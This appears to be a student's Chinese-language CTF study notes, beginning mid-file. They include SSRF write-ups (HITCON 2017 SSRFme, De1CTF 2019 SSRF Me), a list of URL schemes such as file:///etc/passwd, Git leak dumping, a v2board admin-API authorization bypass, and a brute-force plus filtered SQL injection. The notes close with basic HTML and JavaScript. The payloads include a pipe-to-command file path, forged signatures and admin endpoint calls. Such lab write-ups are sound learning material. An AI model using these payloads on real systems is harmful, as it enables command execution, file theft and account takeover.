    curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源

    $filename = './curled/'.rand().'.txt';
    file_put_contents($filename, $result); 
    echo $result;
}
?>
```

> `curl_exec`函数用于执行指定的cURL会话



+  漏洞存在的地方

传参里面存在文件后缀或者协议的地方等

1.出现协议

很可能可以发起请求

2.出现文件后缀

有可能存在任意文件读取

Download=xxxx/xxx/xx

1.19

+ [[HITCON 2017\]SSRFme

  perl脚本GET open命令漏洞；open存在命令执行，并且还支持file函数

题目的意思是先以MD5(orange .ip)生成一个hash,放在sandbox之下，然后使用GET命令进行访问，那里就可以使用perl 进行命令执行，执行的前提是 前面必须要创建一个和这个命令一样的文件。然后呢就是将命令执行的结果放到我们传进去的文件里面。

首先要看看目录

写入文件       ?url=/&filename=abc

$sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);

则需要MD5加密

![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\68A3582131CF1970B2603804967F6259.jpg)



再输入http://261dd5aa-8a81-47e7-a6d6-fe60f85a68d7.node4.buuoj.cn:81]/sandbox/md5(orange+ip)/abc



![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\C49BFFE7BCB12BF44F43241E5526D042.jpg)

可以看到根目录有flag 以及readflag ，猜测需要readflag

所以我们用file协议运行readflag就行啦，这里要注意必须得满足前面的文件存在才会命令执行，所以我们要创建一个与命令同名的文件。

?url=&filename=|/readflag 

?url=file:|/readflag&filename=abc

http://261dd5aa-8a81-47e7-a6d6-fe60f85a68d7.node4.buuoj.cn:81]/sandbox/md5(orange+ip)/abc

就可以得到flag!

![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\D5A4E8C4FEFDCB1EF696EB623A6E197E.jpg)

1.20  

## [De1CTF 2019]SSRF Me

开始题目就给了源代码，但是需要整理，我直接在网上找到别人整理完的直接用了。

![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\7B339BD0239A68D66BDC87D1D34DAE30.jpg)

Flask框架，先看路由，geneSign是对传入的param与其他字符串拼接并返回其md5值，De1ta是主要，传入3个参数，以及ip，先判断param是否是gopher或者file开头的参数，不是则过到Task中，并且返回task的Exec()函数结果，另外hint给出提示在flag.txt中有flag
三个参数为

action = urllib.unquote(request.cookies.get("action"))
param = urllib.unquote(request.args.get("param", ""))
sign = urllib.unquote(request.cookies.get("sign"))

第一个参数action是传入read和scan的
第二个参数看着应该是传入一个文件名
第三个参数sign是一个md5值

需要满足self.checkSign()，

就需要getSign(self.action, self.param) == self.sign，

注意到/geneSign中已经将action定为**scan**，所以我们传入的param可以为flag.txtread，这样的话还是会拼接为secert_key + 'flag.txtreadscan

则第一个payload为

/geneSign?param=flag.txtread

![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\81BBCFCF047B96A04F0528E46A92FCF3.jpg)

得到哈希值。

接下来利用burp抓包，改包。

（需要打开De1ta，并传参。

Cookie：action=readscan;sign=哈希值；

param=flag.txt

）

![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\8980871DC3DE7FFDA34159BE7006F825.jpg)

就得出flag.

## SSRF中URL的伪协议 



当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议

file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：
sftp:// SSH文件传输协议或安全文件传输协议
ldap:// 轻量级目录访问协议
tftp:// 简单文件传输协议
gopher:// 分布式文档传递服务，可使用gopherus生成payload

1、file

这种URL Schema可以尝试从文件系统中获取文件：



如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：

2、dict

这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：



3、sftp

在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。

4、ldap://或ldaps:// 或ldapi://

LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。



5、tftp://

TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。



6、gopher://

Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。







## Git Leakage

在kali中安装git hacker

工具原理：

1. 解析.git/index信息，并找到工程中所有文件名和文件shal，
2. 去.git/objects文件夹下载对应的文件
3. 通过zlib解压文件
4. 按原始的目录结构写入源代码

然后在githacker打开终端输入

python2 GitHack.py http://week-2.hgame.lwsec.cn:31574/.git/（注意是python2）

可以看目录，再从其中找到flag.



## **v2board**

本题考查`v2board`的越权访问漏洞

通过 authorizetion 可以越权

注册任意一个用户进行登陆后获取到 auth_data 就可以任意调用 管理员的接口

（文章https://www.ctfiot.com/86202.html）

先注册一个账号，再在登陆账号时用burp进行抓包![IMG_20230129_122434](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230129_122434.jpg)

没注册时会出现错误![IMG_20230128_221327](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230128_221327.jpg)

可以看到auth_data即authorization的值

登录后在进行抓包，访问/api/v1/admin/user/fetch并加上authorization的值

![IMG_20230129_123006](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230129_123006.jpg)

得到要求的token得到flag

![IMG_20230129_123330](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230129_123330.jpg)

## Search Commodity

这个题前半部分跟以前做过的一个题差不多，需要先爆破一次密码。

由于提示给了是一个弱口令，在网上找一个字典![IMG_20230129_134509](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230129_134509.jpg)

进行爆破

![IMG_20230129_134450](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230129_134450.jpg)

发现密码为admin123

登录进去可以看到是一个sql注入![IMG_20230129_134754](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230129_134754.jpg)

尝试使用万能注入`1 and 1=1`，但没有得到预期结果。发现有被过滤的情况。

在网上找到别人的一个脚本

通过使用该脚本定位被过滤的单词，并对其绕过，构造payload得到表名5ecret15here,L1st,user1nf0![IMG_20230129_135333](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230129_135333.jpg)

在根据提示找到列名 f14gggg1shere

![IMG_20230129_135355](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230129_135355.jpg)



最终得到flag

![IMG_20230129_135412](D:\OneDrive\文档\Tencent Files\1339071002\FileRecv\MobileFile\IMG_20230129_135412.jpg)









## HTML



<p> 元素定义一个段落<!DOCTYPE html> 声明为 HTML5 文档
<html> 元素是 HTML 页面的根元素
<head> 元素包含了文档的元（meta）数据，如 <meta charset="utf-8"> 定义网页编码格式为 utf-8（由于在大部分浏览器中直接输出中文会出现乱码，所以要在头部将字符声明为UTF-8）
<title> 元素描述了文档的标题
<body> 元素包含了可见的页面内容
<h1> 元素定义一个大标题
<p> 元素定义一个段落

HTML `<script>` 标签用于定义客户端脚本（JavaScript）。

<script> 元素即可包含脚本语句，也可通过 src 属性指向外部脚本文件。

JavaScript 的常见用途是图像处理、表单验证和内容的动态更改。



***\*JS是一门弱类型的语言，用于给我html页面上面添加动态效果与互相操作。\****

JS基础语句关键词

    break               终止 switch 或循环。
    continue            跳出循环并在顶端开始。
    debugger            停止执行 JavaScript，并调用调试函数（如果可用）。
    do...while          执行语句块，并在条件为真时重复代码块。
    for                 标记需被执行的语句块，只要条件为真。
    function            声明函数。
    if...else           标记需被执行的语句块，根据某个条件。
    return              退出函数。
    switch              标记需被执行的语句块，根据不同的情况。
    try...catch         对语句块实现错误处理。
    var                 声明变量。
        与JAVA和C不同，JS的变量无特定的类型
            定义变量时只用var运算符，可以初始化为任何值
    
        var color = "red";
        var num = 25;
        var visible = true;
    
     单行注释以双斜杠开头（//）
    多行注释以单斜杠和星号开头（/*），以星号和单斜杠结尾（*/）

### 数据类型

var length = 16; 

Number 通过数字字面量赋值 var points = x * 10;  

 Number 通过表达式字面量赋值 var lastName = "Johnson";   

 String 通过字符串字面量赋值 var cars = ["Saab", "Volvo", "BMW"];

 Array  通过数组字面量赋值 var person = {firstName:"John", lastName:"Doe"};  

 Object 通过对象字面量赋值

